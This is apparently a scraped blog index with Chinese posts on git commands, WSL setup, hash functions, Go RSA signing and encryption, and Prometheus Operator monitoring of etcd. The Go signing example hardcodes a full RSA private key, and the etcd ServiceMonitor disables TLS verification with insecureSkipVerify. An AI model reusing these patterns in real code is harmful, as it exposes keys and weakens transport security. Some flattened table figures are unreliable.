Branch branch 用于管理分支\ncommand describe git branch List all branches git checkout -b BRANCH Create the branch on your local machine and switch in this branch git branch BRANCH COMMIT_HASH Create branch from commit git push REMOTE BRANCH Push the branch to remote git branch -m OLD_BRANCH NEW_BRANCH Rename other branch git branch -m NEW_BRANCH Rename current branch # Rename branch locally\ngit branch -m OLD_BRANCH NEW_BRANCH # Delete the old branch\ngit push origin :OLD_BRANCH\n# Push the new branch, set local branch to track the new remote\ngit push \u0026ndash;set-upstream REMOTE NEW_BRANCH Rename remote branch git branch -D BRANCH\ngit push REMOTE :BRANCH Delete a branch locally and remote git branch | grep -v \u0026ldquo;master\u0026rdquo; | xargs git branch -D Delete all local branches but master Commit Record changes to the repository\ncommand describe git reset \u0026ndash;hard HEAD~1 Undo last commit git rebase -i HEAD~5\ngit reset \u0026ndash;soft HEAD~5\ngit add .\ngit commit -m \u0026ldquo;Update\u0026rdquo;\ngit push -f origin master Squash last n commits into one commit git branch newbranch\n# Go back 3 commits. You will lose uncommitted work.1\ngit reset \u0026ndash;hard HEAD~3\ngit checkout newbranch Move last commits into new branch: git rebase -i HEAD^^^\ngit add .\ngit rebase \u0026ndash;continue Make changes to older commit Merge Join two or more development histories together\ncommand describe git checkout BRANCH\ngit merge \u0026ndash;no-ff BASE_BRANCH Merge commits from master into feature branch git merge BRANCH Current branch merge to BRANCH branch git merge -m “Merge from Dev” When merge branch add comment git merge -s ours obsolete Merge obsolete branch to current branch using ours policy git merge \u0026ndash;no-commit maint Merge maint branch to current, than do not make new comment Cherry Pick Apply the changes introduced by some existing commits\ngit cherry-pick COMMIT_HASH_A COMMIT_HASH_B\rRevert command describe git revert HEAD Revert the previous commit git revert \u0026ndash;no-commit HEAD~3.. Revert the changes from previous 3 commits without making commit Amend command describe git commit \u0026ndash;amend Amend previous commit git commit \u0026ndash;amend \u0026ndash;no-edit git commit \u0026ndash;amend -m \u0026ldquo;COMMIT_MESSAGE\u0026rdquo; Changing git commit message git commit \u0026ndash;amend -m \u0026ldquo;COMMIT_MESSAGE\u0026rdquo;\ngit push \u0026ndash;force REMOTE BRANCH Changing git commit message after push Reflog reference log\ncommand describe git reflog Show reflog Get commit Rebase Rebase the current branch onto another branch\ncommand describe git rebase BASE_BRANCH Rebase the current branch onto another branch git rebase \u0026ndash;continue Continue rebase git rebase \u0026ndash;abort Abort rebase Tracking command describe git clean Remove untracked files git reset FILE_PATH Remove file from index git reset Reset the index to match the most recent commit git reset \u0026ndash;hard Reset the index and the working directory to match the most recent commit git rm file Remove files from the working tree and from the index git ls-files Show information about files in the index and the working tree git ls-files -d Show deleted files in the output. git ls-files -m Show modified files in the output. git ls-files -i Show only ignored files in the output. git ls-files \u0026ndash;no-empty-directory Do not list empty directories. Has no effect without \u0026ndash;directory. Config command describe git config -l list all git config git config \u0026ndash;global [key] \u0026ldquo;[value]\u0026rdquo; set global configuation git config [key] \u0026ldquo;[value]\u0026rdquo; set current repositories configuation Reference：\nawesome-git-commands\n","permalink":"https://www.oomkill.com/2020/11/awesome-git-command/","summary":"","title":"awesome git command"},{"content":"什么是WSL Windows Subsystem for Linux 简称WLS，适用于Linux的Windows子系统，可以直接在Windows上运行Linux环境（包括大部分命令行工具）\nLinux containers与Windows Subsystem for Linux（WSL）区别 此处以docker与wsl进行一些比较，主要为个人的理解之处。\ndocker与wsl同样运行在本机环境中运行，不依赖其他管理程序与虚拟化。 docker与wsl同样为应用容器。\n安装WSL 在Windows10上，用于Linux的Windows子系，可运行受支持的Linux版本（例如Ubuntu，OpenSuse，Debian等），而无需设置操作系统的复杂性。虚拟机或其他计算机。\n使用设置为Linux启用Windows子系统 打开设置 点击“应用”。 在“相关设置”部分下，单击“程序和功能”选项 单击左窗格中的“打开或关闭Windows功能”选项。 检查Windows Subsystem for Linux选项。 完成这些步骤后，将配置该环境以下载并运行Windows 10上的Linux版本。\n使用Microsoft Store安装Linux发行版 要在Windows 10上安装Linux发行版，请使用以下步骤：\n打开Microsoft Store。搜索要安装的Linux发行版。一些可用的发行版包括：\nUbuntu OpenSuse Kali Linux Debian Alpine WSL Suse Linux Enterprise 选择要在您的设备上安装的Linux发行版。 单击获取（或安装）按钮。 Microsoft Store安装Linux发行版 单击启动按钮。为Linux发行版创建一个用户名，然后按Enter键。 指定发行版的密码，然后按Enter。 重复密码，然后按Enter确认。 完成以上步骤后，即完成安装了WLS（没有图形界面），在开始菜单 运行 wls 启动。\n离线安装WLS 官网指导手册内包含所支持的Linux离线安装包\n这里下载的为Ubuntu 18.04，下载后，文件格式为appx格式，本次使用的操作系统为，windows1709企业版，并且卸载了所有的 UWP应用。因此只能使用命令行进行安装。\n非LTSC企业版或卸载windows store的可以直接双击安装\n管理员打开Powershell 运行以下命令，将路径替换为下载的离线安装包路径。本次安装的wls默认安装到C盘\nAdd-AppxPackage .\\app_name.appx 查看已经安装的子系统\nwslconfig /l 安装时选择其他盘安装 首先解压.appx文件\n用 LxRunOffline 安装：\nwindows10 1803以上版本下载最新版即可，windows 1709及一下，可以安装2.x版本。\n使用以下命令安装，-f后的文件为解压后文件内根目录的install.tar.gz 语法\nLxRunOffline.exe install -n \u0026lt;install systemname\u0026gt; -d \u0026lt;save path\u0026gt; -f \u0026lt;unzip_path/install.tar.gz\u0026gt; LxRunOffline.exe install -n ubuntu -d d:\\wls -f d:\\Ubuntu_1804.2019.522.0_x64\\install.tar.gz 等运行完成后（warning可忽略），开始 =\u0026gt; 运行wls进入，进入后默认就是root用户。另外开始菜单不会有单独的启动的图标。\n如何在重装系统后恢复原来的WSL .\\LxRunOffline.exe rg -n ubuntu -d D:\\wsl\\ubuntu 配置wsl与windows共用开发环境 本次配置的开发环境为golang与goland，在windows下与linux下的环境开发与运行为相同的环境。其他的开发环境类似。\n因为wsl共享windows的路径，可以再windows与linux安装golang编译器。并分别设置go env\nwindows set GO111MODULE=on set GOPATH=D:\\go_work set GOPROXY=https://goproxy.io,https://goproxy.cn,direct set GOROOT=C:\\Go Linux，GOPATH要与windows设置为同一个路径，这样可以保证安装的包为同一个。即实现了同一个开发环境与Linux环境。\nexport GO111MODULE=on export GOPROXY=https://goproxy.io,https://goproxy.cn,direct export GOROOT=/usr/local/go export GOPATH=/mnt/d/go_work/ export PATH=$PATH:$GOROOT/bin:$GOPATH/bin goland设置 file =\u0026gt; setting =\u0026gt; Tools =\u0026gt; Terminal\nC:\\Windows\\System32\\wsl.exe file =\u0026gt; setting =\u0026gt; Editor =\u0026gt; Code Style\ngoland wls terminal .bashrc不生效 在wsl中发现一些环境变量、shell颜色等都不生效。这里需要了解shell的类型\nshell有两种类型，Login Shell和Non Login Shell。每一个shell都有自己自定义的脚本来预设值shell运行的环境。\nLogin Shell 当成功登陆用户后，将创建登陆shell（通过ssh sudo 或者 terminal）\n查看当前shell是什么类型的shell echo $0\nLogin Shell：-bash或-su。 Non Login Shell： bash或su Login shell 登陆后执行以下脚本：\n登陆执行/etc/profile /etc/profile执行/etc/profile.d中的所有脚本 然后执行用户 ~/.bash_profile ~/.bash_profile 会有命令执行用户目录 ~/.bashrc ~/.bashrc中会执行 /etc/bashrc\nNon Login Shell Non Login Shell是由Login Shell启动的shell。例如，登陆成功后执行bash，此时是Non Login Shell\nNon Login Shell登陆后执行以下脚本：\n首先执行 ~/.bashrc 然后 ~/.bashrc 执行 /etc/bashrc /etc/bashrc 调用 /etc/profile.d 中的脚本\n了解了执行顺序后，按照步骤查看对应问题所在，此处问题没有~/.bashrc中设置的alias和颜色。根据Login shell流程应为~/.bash_profile中去执行~/.bashrc，查看~/.bash_profile 发现文件为空。\n复制一份linux ~/.bash_profile 中的文件内容到对应的~/.bash_profile后发现功能已经正常实现。\n# .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs PATH=$PATH:$HOME/bin ","permalink":"https://www.oomkill.com/2020/11/linux-subsystem-in-win10/","summary":"","title":"适用于windows10 Linux子系统的安装管理配置"},{"content":"散列函数（Hash function）又称散列算法、哈希函数，散列函数把消息或数据压缩成摘要，使得数据量变小，将数据的格式固定下来。该函数将数据打乱混合，重新创建一个叫做散列值（hash values）的指纹。这种转化是一种压缩映射，也就是散列值的空间通常远小于输入值的空间，不同的输入可能会散列成相同的输出，二不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要函数。\n散列函数性质 通过使用单向散列函数，即便是确认几百MB大小的文件的完整性，也只要对比很短的散列值就可以了。那么，单向散列函数必须具备怎样的性质呢？我们来整理一下。\n根据任意长度的消息计算出固定长度的散列值\n能够快速计算出散列值\n计算散列值所花费的时间短。尽管消息越长，计算散列值的时间也会越长，但如果不能在现实的时间内完成计算就没有意义了。\n消息不同散列值也不同\n难以发现碰撞的性质称为抗碰撞性（collisionresistance）。密码技术中所使用的单向散列函数，都需要具备抗碰撞性。强抗碰撞性，是指要找到散列值相同的两条不同的消息是非常困难的这一性质。在这里，散列值可以是任意值。密码技术中的单向散列函数必须具备强抗碰撞性。\n具备单向性\n单向散列函数必须具备单向性（one-way）。单向性指的是无法通过散列值反算出消息的性质。根据消息计算散列值可以很容易，但这条单行路是无法反过来走的。\n散列函数的应用 散列函数应用具有多样性\n安全加密：\n保护资料，散列值可用于唯一地识别机密信息。这需要散列函数是抗碰撞(collision-resistant)的，意味着很难找到产生相同散列值的资料。如数字签名、消息认证码。 数据校验：\n确保传递真实的信息：消息或数据的接受者确认消息是否被篡改的性质叫数据的真实性，也称为完整性。 错误校正：使用一个散列函数可以很直观的检测出数据在传输时发生的错误。 负载均衡：\n通过hash算法，对客户端IP进行计算hash值，将取到值与服务器数量进行取模运算。 分布式存储：如一致性hash。\n常用单项散列函数 MD4 MD5 MD5在1996年后被证实存在弱点，可以被加以破解，对于需要高度安全性的资料，专家一般建议改用其他算法，如SHA-2。2004年，证实MD5算法无法防止碰撞攻击，因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途。\nSHA-1 SHA-2 SHA-1：1995年发布，SHA-1在许多安全协议中广为使用，包括TLS、GnuPG、SSH、S/MIME和IPsec，是MD5的后继者。但SHA-1的安全性在2010年以后已经不被大多数的加密场景所接受。2017年荷兰密码学研究小组CWI和Google正式宣布攻破了SHA-1。\nSHA-2：2001年发布，包括SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256。SHA-2目前没有出现明显的弱点。虽然至今尚未出现对SHA-2有效的攻击，但它的算法跟SHA-1基本上仍然相似。 比特币使用的sha-256进行的数字签名\n算法和变体 输出散列值长度 （bits） 中继散列值长度 （bits） 资料区块长度 （bits） 最大输入消息长度 （bits） MD5 128 128 (4 × 32) 512 无限 SHA-0 160 160 (5 × 32) 512 264 − 1 SHA-1 160 160 (5 × 32) 512 264 − 1 SHA-2 SHA-224 SHA-256 224 256 256 (8 × 32) 512 SHA-384 SHA-512 SHA-512/224 SHA-512/256 384 512 224 256 512 (8 × 64) 1024 2128 − 1 Go语言中使用散列函数 Go语言使用MD5 方式一：\nmd5.Sum(\u0026quot;123\u0026quot;) 方式2:\nfunc getMD5_2(str []byte) string { // 1. 创建一个使用MD5校验的Hash对象` myHash := md5.New() // 2. 通过io操作将数据写入hash对象中 io.WriteString(myHash, \u0026quot;hello\u0026quot;) //io.WriteString(myHash, \u0026quot;, world\u0026quot;) myHash.Write([]byte(\u0026quot;, world\u0026quot;)) // 3. 计算结果 result := myHash.Sum(nil) fmt.Println(result) // 4. 将结果转换为16进制格式字符串 res := fmt.Sprintf(\u0026quot;%x\u0026quot;, result) fmt.Println(res) // --- 这是另外一种格式化切片的方式 res = hex.EncodeToString(result) fmt.Println(res) return res } Go语言SHA-1、SHA-2的使用 方法一：\nsha512.Sum512() sha256.Sum256() 方法二与md5的使用类似\n","permalink":"https://www.oomkill.com/2020/11/hash-function/","summary":"","title":"常用加密算法学习总结之散列函数(hash function)"},{"content":"数字签名（Digital Signature），通俗来讲是基于非对称加密算法，用秘钥对内容进行散列值签名，在对内容与签名一起发送。\n更详细的解说 更详细的解说 - 中文\n数字签名的生成个验证 签名\n⑴ 对数据进行散列值运算。 ⑵ 签名：使用签名者的私钥对数据的散列值进行加密。 ⑶ 数字签名数据：签名与原始数据。\n图：数字签名 Source：https://cheapsslsecurity.com/blog/digital-signature-vs-digital-certificate-the-difference-explained/ 验证 ⑴ 接收数据：原始数据\u0026amp;数字签名。 ⑵ 使用公钥进行解密得到散列值。 ⑶ 将原始数据的散列值与解密后的散列值进行对比。\nGo语言中使用RSA进行数字签名 ⑴ pem解码：使用pem对私钥进行解码, 得到pem.Block结构体 ⑵ 获得私钥：使用GO x509接口pem.Block据解析成私钥结构体 ⑶ 计算hash值：对明文进行散列值计算 ⑷ 使用秘钥对散列值签名\npackage main import ( \u0026quot;crypto\u0026quot; \u0026quot;crypto/rand\u0026quot; \u0026quot;crypto/rsa\u0026quot; \u0026quot;crypto/sha256\u0026quot; \u0026quot;crypto/x509\u0026quot; \u0026quot;encoding/pem\u0026quot; \u0026quot;fmt\u0026quot; ) var ( private = `-----BEGIN 私钥----- MIICXQIBAAKBgQDc73afIxqYOHg80puDIMYrqUAiTi8EiTVDEiO9YE3+VxRvN0sa pe3zx1UdhgIn3iCPUzyI2vwNADId3LjuIjkdCcdB2fHrBTbcy6u0545HnY42F9aQ 7cAr168bHcqhQoKcna9i9nukO+w7So1J9C6Wr8J4e4923q7+T7z7bZeXywIDAQAB AoGBAItX5KLdywoyo3MJCdgcNaCX8MEyOmlL+HHC4ROxx78gQN0cLJw0Bu33zHEA ch+e8z4yKz3Nj6bLdtBqw6A9qXLBCfWfD/p9YKDZNFP/6+u9teUirOgiBSq7kXWy mtBm0I3pz33EomCuSJzLj/Mj/fkKs+425jPFcZboJdZpCyBhAkEA8mtGUGYuAZwV RKBDkf1bz5EyPBGV+9CyXa6pd6md61APY0j+qhb1w9ADfHKkAzfoilhpucznRhaz kAheqMPAMwJBAOlQEx2Ytc8TxfFqhF8RPTODe2N0jBBvsvJ85k7vNiQ+hnmaAray XS6pCbZdvmGHYKlz3MVGeis/UJKDdSzE0gkCQQCoZijkNPcEmz6S+5m00oFywXRa EgVUdndRaMHEpIlVK7pkyBJQab60Fc42JxUUP0RExoI7VcHbCG4YQhgvuDvNAkBQ CUolcwebe/sBcDrsqetGyqn/WjHaSZcnnDUdiu4VzOUwveaEafeRVCeiydHPfzNn rflkK2MphtTLDhGaRAKRAkASKlhV8aTBzTty/V3XMQfFVIAdHCyEIGMdjDDSzPly shZCn66IyIze8j5Q4ZLcRz6GPglHdrkBnyt4QFuGurpl -----END 私钥-----` public = `-----BEGIN 公钥----- MIGJAoGBANzvdp8jGpg4eDzSm4MgxiupQCJOLwSJNUMSI71gTf5XFG83Sxql7fPH VR2GAifeII9TPIja/A0AMh3cuO4iOR0Jx0HZ8esFNtzLq7TnjkedjjYX1pDtwCvX rxsdyqFCgpydr2L2e6Q77DtKjUn0Lpavwnh7j3berv5PvPttl5fLAgMBAAE= -----END 公钥-----` ) func digitalSign(privateKey, plainText string) (signText []byte, err error) { var ( pemBlock, _ = pem.Decode([]byte(privateKey)) privateStream *rsa.PrivateKey plainHash = sha256.Sum256([]byte(plainText)) ) if privateStream, err = x509.ParsePKCS1PrivateKey(pemBlock.Bytes); err != nil { return } if signText, err = rsa.SignPKCS1v15(rand.Reader, privateStream, crypto.SHA256, plainHash[:]); err != nil { return } return } func digitalVerify(publicKeyByte, plainText string, signText []byte) (ok bool, err error) { var ( pemBlock, _ = pem.Decode([]byte(publicKeyByte)) publicStream *rsa.PublicKey plainHash = sha256.Sum256([]byte(plainText)) ) if publicStream, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes); err != nil { return } if err = rsa.VerifyPKCS1v15(publicStream, crypto.SHA256, plainHash[:], signText); err != nil { return } return true, nil } func main() { text, err := digitalSign(private, \u0026quot;张三李四王五赵柳\u0026quot;) ok, err := digitalVerify(public, \u0026quot;张三李四王五赵柳\u0026quot;, text) fmt.Println(ok) fmt.Println(err) } 总结 在Go语言API中公钥私钥的注释头尾也需要加上\n","permalink":"https://www.oomkill.com/2020/11/digital-signature/","summary":"","title":"常用加密算法学习总结之数字签名"},{"content":"什么是 Operator？ Operator是由CoreOS公司开发的，用来扩展kubernetes APi的特定的应用程序控制器，Operator基于Kubernetes的资源和控制器概念之上构建，但同时又包含了对相应应用程序特定的一些专业知识。创建operator的关键是 CRD（CustomResourceDefinition）的设计。\nPrometheus Operator Prometheus Operator 是CoreOS公司提供的基于Prometheus及其相关监视组件对Kubernetes集群组件的管理，该Operator目的是简化和自动化针对Kubernetes集群的基于Prometheus的管理及配置。\nPrometheus Operator架构组件 Operator：作为Prometheus Operator的核心组件，也即是自定义的控制器，用来监视和部署管理Prometheus Operator CRD资源对象，监控并维持CRD资源状态。 Prometheus Server：Operator 根据自定义资源 Prometheus 类型中定义的内容而部署的Prometheus Cluster Prometheus Operator CRD： Prometheus：以CRD资源提供给Operator的类似于Pod资源清单定位的资源。 ServiceMonitor：声明定义对Kubernetes Services资源进行监控，使用标签选择器来选择所需配置的监控，后端是Service的Endpoint，通过Service标签选择器获取EndPoint对象。 PodMonitor：使用标签选择器，选择对匹配Pod进行监控 Alertmanager：声明定义了Alertmanager在Kubernetes中运行所提供的配置。 PrometheusRule: 声明定义了Prometheus在Kubernetes中运行所需的Rule配置。 reference\nPrometheus-Operator-design\nPrometheus Operator监控二进制kubernetes 查看兼容性列表选择对应的版本来下载，此处kubernetes集群为1.8.10 。\n对应地址为 https://github.com/prometheus-operator/kube-prometheus.git ，可以在域名后添加.cnpmjs.org 访问中国的github加速。\ngit clone https://github.com.cnpmjs.org/prometheus-operator/kube-prometheus.git\r资源清单在项目目录 manifests CRD在 manifests/setup 需要先安装CRD 和 Operator 对象\nkube-controller-manager 和 kube-scheduler 无监控数据 二进制部署的Kubernetes集群中部署Prometheus Operator，会发现在prometheus server的页面上发现kube-controller和kube-schedule的target为0/0。匹配不到节点信息，这是因为serviceMonitor是根据label去选取svc的。此处svc并没有kube-controller和kube-schedule 需要手动创建。\napiVersion: v1\rkind: Service\rmetadata:\rnamespace: kube-system\rname: kube-controller-manager\rlabels:\rk8s-app: kube-controller-manager\rcomponent: kube-controller-manager\rspec:\rselector:\rk8s-app: kube-controller-manager\rcomponent: kube-controller-manager\rports:\r- name: https-metrics\rport: 10252\rtargetPort: 10252\r---\rapiVersion: v1\rkind: Endpoints\rmetadata:\rnamespace: kube-system\rname: kube-controller-manager\rlabels:\rk8s-app: kube-controller-manager\rcomponent: kube-controller-manager\rsubsets:\r- addresses:\r- ip: \u0026quot;10.0.0.5\u0026quot;\rnodeName: \u0026quot;master01\u0026quot;\rports:\r- port: 10252\rname: https-metrics\r---\rapiVersion: v1\rkind: Service\rmetadata:\rnamespace: kube-system\rname: kube-scheduler\rlabels:\rk8s-app: kube-scheduler\rcomponent: kube-scheduler\rspec:\rselector:\rk8s-app: kube-scheduler\rcomponent: kube-scheduler\rports:\r- name: https-metrics\rport: 10251\rtargetPort: 10251\r---\rapiVersion: v1\rkind: Endpoints\rmetadata:\rnamespace: kube-system\rname: kube-scheduler\rlabels:\rk8s-app: kube-scheduler\rcomponent: kube-scheduler\rsubsets:\r- addresses:\r- ip: \u0026quot;10.0.0.5\u0026quot;\rnodeName: \u0026quot;master01\u0026quot;\rports:\r- port: 10251\rname: https-metrics\r此处需要注意的是：需要修改对应的Prometheus Operator资源清单的值一直才能获取到目标\nService.spec.ports.name要和ServiceMonitor.spec.endpoints.port的名称对应。\nService.metadata.namespace要和ServiceMonitor.namespaceSelector.matchNames对应\nService.metadata.labels的key要和ServiceMonitor.JobLabel对应\nService.metadata.labels 要和 ServiceMonitor.selector.matchLabels对应\n监控第三方的服务及自定义servicemonitor 一、查看 Etcd 信息 这里的etcd采用二进制方法安装，可以直接访问 host:2379/metrics 获得。\n二、将证书存入 Kubernetes 创建secret\nkubectl create secret generic hketcd \\\r--from-file='/etc/etcd/pki/client.crt' \\\r--from-file='/etc/etcd/pki/client.key' \\\r--from-file='/etc/etcd/pki/ca.crt' \\\r-n monitoring\r三、将证书挂入 PrometheusServer 方法1： kubectl edit prometheus k8s -n monitoring\n方法2：修改 prometheus-prometheus.yaml 文件\n增加内容：\nreplicas: 2\rsecrets:\r- hketcd\r挂入后的证书保存在目录 /etc/prometheus/secrets/{secret_name}/ 下。\n四、创建 Etcd Service \u0026amp; Endpoints apiVersion: v1\rkind: Service\rmetadata:\rnamespace: kube-system\rname: etcdmaster\rlabels:\rk8s-app: etcd\rcomponent: etcd\rspec:\rselector:\rk8s-app: etcd\rcomponent: etcd\rtype: ClusterIP\rclusterIP: None # 设置为None，不分配Service IP\rports:\r- name: https-metrics\rport: 2379\r---\rapiVersion: v1\rkind: Endpoints\rmetadata:\rnamespace: kube-system\rname: etcdmaster\rlabels:\rk8s-app: etcd\rcomponent: etcd\rsubsets:\r- addresses:\r- ip: \u0026quot;10.0.0.5\u0026quot;\rnodeName: \u0026quot;master01\u0026quot;\rports:\r- port: 2379\rname: https-metrics\r---\r五、创建 ServiceMonitor apiVersion: monitoring.coreos.com/v1\rkind: ServiceMonitor\rmetadata:\rname: etcd\rnamespace: monitoring\rlabels:\rk8s-app: etcd\rspec:\rjobLabel: k8s-app # 匹配工作的标签，这里是servicemonitor即 为service的标签\rendpoints: # 此ServiceMonitor的节点\r- port: https-metrics # k8s service endports的设置的端口的名称\rinterval: 30s\rscheme: https\rtlsConfig:\rserverName: hketcd # 访问etcd的名称，因为证书原因需要认证访问的名称\rcaFile: \u0026quot;/etc/prometheus/secrets/hketcd/ca.crt\u0026quot; # 这个是在prometheus容器内挂载的证书\rcertFile: \u0026quot;/etc/prometheus/secrets/hketcd/client.crt\u0026quot;\rkeyFile: \u0026quot;/etc/prometheus/secrets/hketcd/client.key\u0026quot;\rinsecureSkipVerify: true\rselector: # 选择匹配到的endpoints\rmatchLabels:\rk8s-app: etcd\rcomponent: etcd\r# 与matchExpressions: #进行后端的匹配\rnamespaceSelector: # 选择所在资源的名称控件\rmatchNames:\r- kube-system\r","permalink":"https://www.oomkill.com/2020/11/prometheus-operator/","summary":"","title":"prometheus operator使用"},{"content":"公开密钥密码学（英语：Public-key cryptography）也称非对称式密码学（英语：Asymmetric cryptography）是密码学的一种演算法。常用的非对称加密算法有 RSA DSA ECC 等。公开密钥加密\n非对称加密算法使用公钥、私钥来加解密。\n公钥与私钥是成对出现的。 多个用户（终端等）使用的密钥交公钥，只有一个用户（终端等）使用的秘钥叫私钥。 使用公钥加密的数据只有对应的私钥可以解密；使用私钥加密的数据只有对应的公钥可以解密。 非对称加密通信过程 下面我们来看一看使用公钥密码的通信流程。假设Alice要给Bob发送一条消息，Alice是发送者，Bob是接收者，而这一次窃听者Eve依然能够窃所到他们之间的通信内容。 参考自维基百科\n⑴ Alice与bob事先互不认识，也没有可靠安全的沟通渠道，但Alice现在却要透过不安全的互联网向bob发送信息。 ⑵ Alice撰写好原文，原文在未加密的状态下称之为明文 plainText。 ⑶ bob使用密码学安全伪随机数生成器产生一对密钥，其中一个作为公钥 publicKey，另一个作为私钥 privateKey。 ⑷ bob可以用任何方法传送公钥publicKey 给Alice，即使在中间被窃听到也没问题。 ⑸ Alice用公钥publicKey把明文plainText进行加密，得到密文 cipherText ⑹ Alice可以用任何方法传输密文给bob，即使中间被窃听到密文也没问题。 ⑺ bob收到密文，用私钥对密文进行解密，得到明文 plainText。 由于其他人没有私钥，所以无法得知明文；如果Alice，在没有得到bob私钥的情况下，她将重新得到原文。\nRSA RSA是一种非对称加密算法，是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）在1977年一起提出，并以三人姓氏开头字母拼在一起组成的。\nRSA公钥和密钥的获取：随机选择两个大的素数，p q $N = p*q$ RSA加密过程：$cipherText = plainText ^ E mod N$，$(N,e)$为公钥，$(N,d)$为私钥。 RSA解密过程：$plainText = cipherText^ D mod N$\nGo语言中RSA的应用 在Go语言中生成公钥与私钥 生成秘钥流程 ⑴ 使用crypto/rsa中的GenerateKey(random io.Reader, bits int)方法生成私钥（结构体） ⑵ 因为X509证书采用了ASN1描述结构，需要通过Go语言API将的到的私钥（结构体），转换为BER编码规则的字符串。 ⑶ 需要将ASN1 BER 规则转回为PEM数据编码。pem.Encode(out io.Writer, b *Block) ⑷ 将返回的数据保存\n生成私钥 func GeneratePrivateKey(keySize int) (privateKey bytes.Buffer, err error) { // 生成私钥 var ( privateKeyStruct *rsa.PrivateKey privateStream []byte ) privateKeyStruct, err = rsa.GenerateKey(rand.Reader, keySize) if err != nil { return } privateStream = x509.MarshalPKCS1PrivateKey(privateKeyStruct) privateBlock := pem.Block{Type: \u0026quot;私钥\u0026quot;, Bytes: privateStream} if err = pem.Encode(\u0026amp;privateKey, \u0026amp;privateBlock); err != nil { return } return } 通过私钥获取公钥 通过私钥获取公钥需要将私钥生成的步骤翻转\n⑴ 私钥[]byte解码为一个pemBlock pem.Decode() ⑵ pemBlock.Bytes是BER编码规则的字符串。将其转换为结构体 x509.ParsePKCS1PrivateKey() ⑶ 转换为的结构体的属性PublicKey为公钥结构体，需将其转换为BER编码规则的字符串。x509.MarshalPKCS1PublicKey(\u0026amp;PublicKey) ⑷ 拼接公钥pemBlock，并需要将ASN1 BER规则字符串转回为PEM数据编码。pem.Encode(out io.Writer, b *Block)\nfunc GetPublicKey(privateKey []byte) (publicKey bytes.Buffer, err error) { pemBlock, _ := pem.Decode(privateKey) privateStream, err := x509.ParsePKCS1PrivateKey(pemBlock.Bytes) if err != nil { return } publicStream := x509.MarshalPKCS1PublicKey(\u0026amp;privateStream.PublicKey) privateBlock := pem.Block{Type: \u0026quot;公钥\u0026quot;, Bytes: publicStream} if err = pem.Encode(\u0026amp;publicKey, \u0026amp;privateBlock); err != nil { return } return } 使用RSA密钥进行加解密 RSA加/解密步骤\n⑴ 因为在生成公钥与私钥时，进行了pem编码，需要先对其（一般情况下加密都使用公钥）进行解码为pemBlock。pem.Decode() ⑵ pemBlock.Bytes是BER编码规则的字符串。将其转换为结构体 x509.ParsePKCS1PublicKey(pemBlock.Bytes) ⑶ 使用 rsa.DecryptPKCS1v15 或 rsa.EncryptPKCS1v15 进行加解密，如：rsa.DecryptPKCS1v15(rand.Reader, public|private stream, []byte plain|cipher)，返回值即为加/解密好的数据。\nfunc RSAEncrypt(publicKey []byte, plainText string) (cipherText []byte, err error) { pemBlock, _ := pem.Decode(publicKey) publicStream, err := x509.ParsePKCS1PublicKey(pemBlock.Bytes) if err != nil { return } if cipherText, err = rsa.EncryptPKCS1v15(rand.Reader, publicStream, []byte(plainText)); err != nil { return } return } func RSADecrypt(privateKey, cipherText []byte) (plainText []byte, err error) { pemBlock, _ := pem.Decode(privateKey) privateStream, err := x509.ParsePKCS1PrivateKey(pemBlock.Bytes) if err != nil { return } if plainText, err = rsa.DecryptPKCS1v15(rand.Reader, privateStream, []byte(cipherText)); err != nil { return } return } 总结\nGo语言接口中，明文内容的长度不能大于秘钥本身。 RSA算法加解密速度慢，不推荐对较大数据加密。 ","permalink":"https://www.oomkill.com/2020/11/asymmetric/","summary":"","title":"常用加密算法学习总结之非对称加密"},{"content":"对称加密，又称为 共享密钥加密算法，是指加密和解密方使用相同密钥的加密算法。对称加密算法的优点在于加解密的高速度和使用长密钥时的难破解性。\n对称加密算法 DES DES（Data Encryption Standard）：数据加密标准，速度较快，适用于加密大量数据的场合。1977年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS）\nDES的加密和解密 DES是一种将64bit（8Byte）的明文加密成64bit的密文的对称密码算法，==它的密钥长度是56比特==。从规格上来说，DES的密钥长度是64bit，但由于每隔7bit会设置一个用于==错误检查==的比特，因此实质上其密钥长度是56bit。\nDES是以64bit的明文（比特序列）为一个单位来进行加密的，这个64bit的单位称为分组。一般来说，以分组为单位进行处理的密码算法称为分组密码（blockcipher），DES就是分组密码的一种。\nDES每次只能加密64比特的数据，如果要加密的明文比较长，就需要对DES加密进行迭代（反复），而迭代的具体方式就称为模式（mode）。\n3DES 3DES（Triple DES）：是三重数据加密算法（TDEA，Triple Data Encryption Algorithm）块密码的通称。是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高。\n3DES是基于计算机的运算能力的增强，基于DES算法，增强秘钥进行多绪加密，而不是一种块密码算法。\nAES AES（Advanced Encryption Standard）：高级加密标准，是美国联邦政府采用的一种区块加密标准。\n分组密码模式 **分组密码（blockcipher）**是每次只能处理特定长度的一块数据的一类密码算法，这里的一块\u0026quot;就称为分组（block）。此外，一个分组的比特数就称为分组长度（blocklength）。\n例如，DES和3DES的分组长度都是64比特。这些密码算法一次只能加密64比特的明文．并生成64比特的密文。\nAES的分组长度可以从128比特、192比特和256比特中进行选择。当选择128比特的分组长度时，AES一次可加密128比特的明文，并生成128比特的密文。\n分组密码算法只能加密固定长度的分组，但是我们需要加密的明文长度可能会超过分组密码的分组长度，这时就需要对分组密码算法进行迭代，以便将一段很长的明文全部加密。而迭代的方法就称为分组密码的模式（mode）。\n分组密码的模式有很多种类，分组密码的主要模式有以下5种：\n明文与密文分组 **明文分组: **是指分组密码算法中作为加密对象的明文。明文分组的长度与分组密码算法的分组长度是相等的。 **密文分组: **是指使用分组密码算法将明文分组加密之后所生成的密文。 ECB模式：Electronic Code Book mode（电子密码本模式） ECB是最简单的加密模式，明文消息被分成固定大小的块（分组），并且每个块被单独加密。 每个块的加密和解密都是独立的，且使用相同的方法进行加密，所以可以进行并行计算，但是这种方法一旦有一个块被破解，使用相同的方法可以解密所有的明文数据，安全性比较差。 